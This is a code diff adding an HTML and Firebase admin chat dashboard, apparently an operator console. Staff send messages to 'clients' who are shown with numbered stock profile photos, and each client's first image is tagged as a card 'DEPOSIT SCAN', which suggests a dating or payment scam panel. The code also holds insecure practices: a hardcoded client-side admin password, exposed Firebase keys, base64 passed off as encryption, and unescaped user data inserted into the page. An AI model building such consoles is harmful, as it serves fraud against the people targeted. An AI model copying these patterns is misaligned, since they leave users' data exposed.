@@ -1,0 +1,267 @@
+   <!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard - Control Center</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Arial,sans-serif;}
+  body{height:100vh;background:black;overflow:hidden;}
+  
+  /* LOGIN */
+  #loginAdmin{height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:linear-gradient(135deg,red,blue);color:yellow;position:fixed;width:100%;z-index:1000;}
+  #loginAdmin input{width:300px;padding:15px;border:none;border-radius:30px;margin-bottom:20px;font-size:16px;text-align:center;box-shadow: 0 4px 15px green;}
+  #loginAdmin button{width:200px;padding:12px;border:none;border-radius:30px;background:green;color:white;font-weight:bold;cursor:pointer;transition: 0.3s;}
+  #loginAdmin button:hover{background:deeppink; transform: scale(1.05);}
+
+  /* DASHBOARD STRUCTURE */
+  #dashboard{display:none;height:100vh;width:100%;}
+  .sidebar{width:88px;background:dimgray;color:white;display:flex;flex-direction:column;border-right:1px solid dimgray;}
+  .sidebar h1{text-align:center;padding:20px;background:dimgray;font-size:18px;letter-spacing: 1px;}
+  #userList{flex:1;overflow-y:auto;}
+  
+  .user-item{display:flex;align-items:center;padding:15px;border-bottom:1px solid yellow;cursor:pointer;transition:0.2s;}
+  .user-item:hover{background:red;}
+  .user-item.active{background:dimgray; border-left: 5px solid black;}
+  .user-item img{width:45px;height:45px;border-radius:50%;margin-right:12px;object-fit:cover;background: dimgray;}
+
+  .chat-container{flex:1;display:flex;flex-direction:column;background:dimgray; position: relative;}
+  
+  /* CHAT HEADER */
+  .chat-header{display:flex;align-items:center;padding:10px 20px;background:tan;color:black;height:70px;box-shadow: 0 2px 5px purple;}
+  .chat-header img{width:50px;height:50px;border-radius:50%;margin-right:15px;object-fit:cover;border: 2px solid Orange;}
+  
+  /* CHAT BODY */
+  .chat-body{flex:1;padding:20px;overflow-y:auto;display:flex;flex-direction:column;gap:12px;}
+  .msg{max-width:70%;padding:10px 15px;border-radius:15px;font-size:14px;word-wrap:break-word;box-shadow:0 1px 2px yellow; position: relative;}
+  .left{background:ivory;align-self:flex-start;border-top-left-radius:0;}
+  .right{background:burlywood;align-self:flex-end;border-top-right-radius:20;}
+  .msg img{max-width:100%;border-radius:10px;margin-top:5px;display:block;cursor: pointer;}
+  .scan-label { color: #d32f2f; font-weight: bold; font-size: 11px; display: block; margin-bottom: 4px; border-bottom: 1px solid blue; padding-bottom: 2px; }
+
+  /* INPUT */
+  .chat-input{display:flex;padding:15px;background:black;gap:10px;align-items:center;}
+  .chat-input input{flex:1;padding:12px 20px;border-radius:25px;border:1px solid MediumSpringGreen;outline:none;}
+  .chat-input button{width:45px;height:45px;border:none;border-radius:50%;background:orange;color:black;cursor:pointer;display:flex;justify-content:center;align-items:center; transition: 0.2s;}
+
+  #localVideo, #remoteVideo{position:fixed;bottom:80px;right:20px;width:180px;border:3px solid red;border-radius:12px;z-index:500;background:black;display:none;}
+  #remoteVideo{bottom:80px;right:210px;}
+</style>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+</head>
+<body>
+
+<div id="loginAdmin">
+  <h2 style="margin-bottom: 20px;">🛡ADMIN ACCES</h2>
+  <input type="password" id="adminPassword" placeholder="Enter security password">
+  <button id="loginBtn">UNLOCK SYSTEM</button>
+  <p id="errorMsg" style="color:#ffbaba; margin-top:15px; font-weight: bold;"></p>
+</div>
+
+<div id="dashboard">
+  <div class="sidebar">
+    <h1>ACTIVE SESSION</h1>
+    <div id="userList"></div>
+  </div>
+
+  <div class="chat-container">
+    <div class="chat-header">
+      <img id="profileImg" src="https://via.placeholder.com/50">
+      <div style="flex:1">
+        <h3 id="profileName">CLIENT'S SELECTION</h3>
+        <small id="profileId" style="opacity: 0.8;"></small>
+      </div>
+      <button id="callBtn" style="background:none; border:none; color:white; font-size:24px; cursor:pointer;">🎥</button>
+    </div>
+
+    <div class="chat-body" id="chatBody"></div>
+
+    <div class="chat-input">
+      <button id="photoBtn" style="background:#128c7e; border:none; border-radius:50%; width:40px; height:40px; color:white; cursor:pointer;">📷</button>
+      <input type="text" id="textInput" placeholder="Write a message to client...">
+      <button id="sendBtn">➤</button>
+      <input type="file" id="photoInput" accept="image/*" hidden>
+    </div>
+  </div>
+</div>
+
+<video id="localVideo" autoplay muted playsinline></video>
+<video id="remoteVideo" autoplay playsinline></video>
+
+<script>
+  
+// ==== CONFIGURATION FIREBASE ====
+
+const ADMIN_PASSWORD = "???Huden123";
+const firebaseConfig = {
+  apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
+  authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
+  projectId: "meet-ur-night-s-dominator",
+  storageBucket: "meet-ur-night-s-dominator.firebasestorage.app",
+  messagingSenderId: "1021669198456",
+  appId: "1:1021669198456:web:31a62bb6003888060afb8d",
+  measurementId: "G-SFPWNFM8PY",
+  databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const notificationSound = new Audio('https://www.soundjay.com/buttons/beep-07a.mp3');
+
+// ==== AUTHENTIFICATION ====
+document.getElementById("loginBtn").onclick = () => {
+  if(document.getElementById("adminPassword").value === ADMIN_PASSWORD){
+    document.getElementById("loginAdmin").style.display = "none";
+    document.getElementById("dashboard").style.display = "flex";
+    initDashboard();
+  } else {
+    document.getElementById("errorMsg").textContent = "❌ Access Denied: Incorrect Password";
+  }
+};
+
+// ==== CRYPTAGE ====
+
+function utf8_to_b64(str){ return btoa(unescape(encodeURIComponent(str))); }
+function b64_to_utf8(str){ try{ return decodeURIComponent(escape(atob(str))); } catch(e){return str;} }
+function encrypt(text,key){ return utf8_to_b64(key+"::"+text); }
+function decrypt(cipher,key){ 
+  try{ 
+    let decoded = b64_to_utf8(cipher);
+    return decoded.includes("::") ? decoded.split("::")[1] : decoded;
+  } catch(e){ return "Encrypted Message"; } 
+}
+function getStaticKey(email, imgNum) { 
+  let cleanEmail = email || "unknown";
+  return btoa(cleanEmail + "_KEY_" + imgNum).slice(0, 16); 
+}
+
+// ==== LOGIQUE DASHBOARD ====
+
+let currentConvKey = null;
+let currentUserData = null;
+
+function initDashboard() {
+  db.ref("active_sessions").on("value", snap => {
+    const userList = document.getElementById("userList");
+    const users = snap.val();
+    if(!users) { userList.innerHTML = "<p style='padding:20px; text-align:center; opacity:0.5;'>No active sessions</p>"; return; }
+    
+    userList.innerHTML = "";
+    for(let key in users){
+      const u = users[key];
+      
+      // Récupération dynamique de l'image (imgNum envoyé par la Page 3)
+      
+      const profilImgNum = u.imgNum || "1"; 
+      
+      const div = document.createElement("div");
+      div.className = "user-item" + (currentConvKey === key ? " active" : "");
+      div.innerHTML = `
+        <img src="IMAGE/img${profilImgNum}.jpg" onerror="this.src='https://via.placeholder.com/50'">
+        <div>
+          <div style="font-weight:bold">${u.name || 'User'}</div>
+          <div style="font-size:11px; opacity:0.7">${u.userEmail}</div>
+        </div>
+      `;
+      div.onclick = () => selectUser(key, u);
+      userList.appendChild(div);
+    }
+  });
+}
+
+function selectUser(key, userData) {
+  currentConvKey = key;
+  currentUserData = userData;
+  
+  document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
+  
+  const profilImgNum = userData.imgNum || "1";
+  document.getElementById("profileName").textContent = userData.name;
+  document.getElementById("profileId").textContent = userData.userEmail;
+  document.getElementById("profileImg").src = `IMAGE/img${profilImgNum}.jpg`;
+  
+  listenToMessages(key, userData);
+}
+
+function listenToMessages(key, userData) {
+  const chatBody = document.getElementById("chatBody");
+  const profilImgNum = userData.imgNum || "1";
+  const encryptionKey = getStaticKey(userData.userEmail, profilImgNum);
+  
+  db.ref("messages/" + key).off(); 
+  db.ref("messages/" + key).on("value", snap => {
+    chatBody.innerHTML = "";
+    const msgs = snap.val();
+    if(!msgs) return;
+
+    let msgIds = Object.keys(msgs);
+    msgIds.forEach((mId, index) => {
+      const m = msgs[mId];
+      const d = document.createElement("div");
+      d.className = "msg " + (m.from === "admin" ? "right" : "left");
+      
+      const content = decrypt(m.message, encryptionKey);
+      
+      if(content.startsWith("data:image")) {
+        
+        // Label spécial pour le tout premier message (le scan)
+        
+        const label = (index === 0 && m.from === "user") ? "<span class='scan-label'>💳 [DEPOSIT SCAN]</span>" : "";
+        d.innerHTML = `${label}<img src="${content}" onclick="window.open(this.src)">`;
+      } else {
+        d.textContent = content;
+      }
+      chatBody.appendChild(d);
+    });
+    chatBody.scrollTop = chatBody.scrollHeight;
+    
+    // Alerte sonore pour les nouveaux messages clients
+    
+    const lastMsg = msgs[msgIds[msgIds.length - 1]];
+    if(lastMsg && lastMsg.from !== "admin") {
+        notificationSound.play().catch(()=>{});
+    }
+  });
+}
+
+// ==== ENVOI MESSAGES ====
+
+document.getElementById("sendBtn").onclick = sendMessage;
+document.getElementById("textInput").onkeypress = (e) => { if(e.key === "Enter") sendMessage(); };
+
+function sendMessage() {
+  const text = document.getElementById("textInput").value.trim();
+  if(!text || !currentConvKey) return;
+  
+  const profilImgNum = currentUserData.imgNum || "1";
+  const key = getStaticKey(currentUserData.userEmail, profilImgNum);
+  db.ref("messages/" + currentConvKey).push({
+    from: "admin",
+    message: encrypt(text, key),
+    timestamp: firebase.database.ServerValue.TIMESTAMP
+  });
+  document.getElementById("textInput").value = "";
+}
+
+document.getElementById("photoBtn").onclick = () => document.getElementById("photoInput").click();
+document.getElementById("photoInput").onchange = (e) => {
+  const file = e.target.files[0];
+  if(!file || !currentConvKey) return;
+  const reader = new FileReader();
+  reader.onload = () => {
+    const profilImgNum = currentUserData.imgNum || "1";
+    const key = getStaticKey(currentUserData.userEmail, profilImgNum);
+    db.ref("messages/" + currentConvKey).push({
+      from: "admin",
+      message: encrypt(reader.result, key),
+      timestamp: firebase.database.ServerValue.TIMESTAMP
+    });
+  };
+  reader.readAsDataURL(file);
+};
+</script>
+</body>
+</html>
